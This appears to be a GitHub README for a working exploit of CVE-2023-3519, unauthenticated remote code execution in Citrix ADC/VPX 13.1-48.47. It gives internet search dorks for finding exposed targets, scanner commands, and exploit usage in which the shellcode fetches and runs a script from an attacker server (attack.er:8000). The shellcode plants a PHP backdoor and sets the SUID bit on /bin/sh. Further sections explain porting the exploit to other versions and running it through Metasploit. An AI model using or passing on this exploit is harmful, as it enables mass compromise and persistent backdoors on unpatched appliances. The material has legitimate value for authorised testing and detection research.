# CVE-2023-3519

![](https://img.shields.io/static/v1?label=Product&message=Citrix%20ADC&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=Citrix%20VPX%2013.1-48.47&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Unauthenticated%20Remote%20Code%20Execution&color=red)



This exploit uses addresses and shellcode for Citrix VPX 13.1-48.47. For the full writeup, click [here](https://bishopfox.com/blog/analysis-exploitation-cve-2023-3519).
 - Shodan dork:
```
title:"NetScaler AAA","Citrix Gateway","NetScaler Gateway"
```
- [Hunter](https://hunter.how/) dork:
```
product.name="NetScaler AAA"
```
```
product.name="Citrix Access Gateway"
```

### Scanner
```
# Check a single URL
python3 scanner.py --url https://example.com

# Check multiple URLs from a file
python scanner.py --file urls.txt

# Check multiple URLs from a file and check for IOCs
python scanner.py --file urls.txt --ioc-check
```
You can also use the [template for nuclei.](https://github.com/SalehLardhi/CVE-2023-3519)

### Usage exploit
NASM is required to build the shellcode. 
```
$ sudo apt install nasm
```

The included shellcode will download and run a shell script from a remote http(s) server. The script takes 3 arguments: the target host, the target port, and the URL of a shell script payload. An example payload which runs `id` and `uname -a` before cleaning up after itself is included in this repo. 

```
$ echo 'id' > a
$ python3 -m http.server &
$ python3 exploit.py target.com 443 attack.er:8000/a
```
The URL must be short enough to fit in the shellcode buffer, and you will get a warning if it is too long. 

### Shellcode artifacts
The shellcode will create a PHP backdoor in `/var/netscaler/logon/a.php` and set the SUID bit on `/bin/sh`. The included `sh` payload shows an example of automatically cleaning up these artifacts. Also note that the shellcode does not close its file descriptors, so excessive repeated exploitation may result in resource exhaustion. 

### Adapting to other versions
For FreeBSD-based Citrix targets, you should only need to find 3 values: the offset of the saved return pointer, a `jmp rsp` ROP gadget (or something equivalent, such as `push rsp; ret;`), and the address to jump to in order to avoid a crash. These parameters are all hardcoded near the top of `exploit.py`.

### Metasploit Framework
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/Citrix%20ADC%20RCE%20CVE-2023-3519/citrix_formssso_target_rce.rb
```
```
cp citrix_formssso_target_rce.rb /usr/share/metasploit-framework/modules/exploits/freebsd/http/
```
```
msfdb reinit; msfconsole -q
```
```
msf6 > use exploits/freebsd/http/citrix_formssso_target_rce.rb
```
```
msf6 exploit(freebsd/http/citrix_formssso_target_rce) > set rhosts target_IP
msf6 exploit(freebsd/http/citrix_formssso_target_rce) > set lhost attacker_IP
msf6 exploit(freebsd/http/citrix_formssso_target_rce) > run
```
